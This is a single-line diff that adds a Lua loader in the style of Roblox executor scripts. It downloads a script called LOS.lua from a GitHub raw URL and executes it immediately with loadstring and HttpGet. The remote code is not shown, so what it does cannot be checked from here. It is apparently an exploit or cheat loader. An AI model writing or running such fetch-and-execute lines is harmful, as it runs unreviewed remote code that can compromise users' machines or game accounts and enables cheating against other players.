@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/DraWatX/Test_01/main/LOS.lua'),true))()
